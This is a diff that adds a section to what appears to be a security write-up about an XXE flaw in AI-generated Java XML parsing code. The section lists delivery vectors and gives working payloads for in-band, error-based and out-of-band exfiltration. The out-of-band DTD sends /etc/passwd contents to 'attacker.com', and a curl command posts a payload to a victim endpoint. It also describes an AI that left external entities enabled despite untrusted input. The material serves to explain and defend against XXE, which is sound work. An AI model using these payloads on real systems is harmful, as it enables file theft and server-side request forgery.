@@ -103,3 +103,79 @@ In production this primitive escalates to:
 - Reading any file the JVM process can read (config, credentials, source code, container secrets)
 - Server-Side Request Forgery via `http://` SYSTEM entities (the JVM fetches an attacker-supplied URL)
 - Denial-of-service via billion-laughs (recursive entity expansion)
+
+## How an attacker actually delivers and observes XXE
+
+XXE only matters if the attacker can both **inject XML** and **observe the parsed result** (or a side effect of parsing). The realistic delivery story has two halves.
+
+### Half 1: get malicious XML into the parser
+
+Anywhere the app accepts XML from an untrusted source:
+
+- **File upload endpoints** — the literal scenario in this prompt: "XML configuration files uploaded by users"
+- **SOAP / WSDL APIs** — XML in, XML out
+- **SAML SSO assertions** — huge in enterprise; XXE in SAML is a recurring CVE class (Cisco, Microsoft, multiple SSO products have shipped this bug)
+- **RSS / Atom feed ingestion** — your service pulls a feed the attacker controls
+- **SVG uploads** — SVG is XML; image-upload pipelines have leaked files this way
+- **Office document formats** — `.docx`, `.xlsx`, `.pptx` are zipped XML; resume upload on a careers site has been a real vector
+- **Content negotiation** — JSON APIs that quietly accept `Content-Type: application/xml`
+- **Webhook receivers, XML-RPC endpoints, configuration import features**
+
+The attacker doesn't need a feature labeled "XML upload." They need any XML parser reachable from input.
+
+### Half 2: get the data back
+
+Three patterns, in order of how hard they are to defend against:
+
+**1. In-band exfiltration — easiest, what this demo shows.** The parser returns parsed values somewhere the attacker sees them. In our demo, `parseXMLFile()` returns a `Map<String, String>` and the surrounding app would render it (admin UI, JSON response, error page, log line). Attacker uploads:
+
+```xml
+<!DOCTYPE config [<!ENTITY pwn SYSTEM "file:///etc/passwd">]>
+<config><setting>&pwn;</setting></config>
+```
+
+Anywhere the parsed map shows up, the file contents come with it.
+
+**2. Error-based exfiltration.** The parser fails on the substituted content and the error message includes the substituted bytes:
+
+```xml
+<!DOCTYPE root [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval; %error;
+]>
+```
+
+The parser tries to resolve `file:///nonexistent/<contents-of-passwd>`, fails, and dumps the failed path into a stack trace the app surfaces. Useful when the parsed data isn't echoed back but errors are.
+
+**3. Out-of-band (OOB) exfiltration — no echo needed.** The parser itself does the network call. Attacker hosts a DTD on their server:
+
+```xml
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%data;'>">
+%param; %exfil;
+```
+
+Now the JVM:
+
+1. Reads `/etc/passwd`
+2. Substitutes the contents into a URL pointing at `attacker.com`
+3. Fetches that URL — sending the file contents as a query parameter
+
+The attacker reads their own web logs. The vulnerable app can be a black box that returns nothing — just reaching the parser is enough. This is the version that matters for "blind" XXE where the response gives nothing away.
+
+### What this looks like in practice
+
+If `parseXMLFile()` were behind an HTTP endpoint, the attack is one curl call:
+
+```bash
+curl -X POST https://victim.example.com/api/upload-config \
+     -H 'Content-Type: application/xml' \
+     --data-binary @payload.xml
+```
+
+…where `payload.xml` is what `Exploit.java` writes in this demo. The response (or a follow-up "show my parsed config" GET) renders the leaked file contents as if they were a configuration setting the user uploaded.
+
+### Why the prompt's wording matters
+
+The prompt says "XML configuration files uploaded by users" — explicit acknowledgement that input is **untrusted**. The AI still didn't disable external entities. A safer codebase isolates XML parsers, calls `factory.setFeature(...)` to disable DTDs, or uses a different format entirely. The AI didn't reach for any of those because the prompt didn't ask, and the JDK default is unsafe.
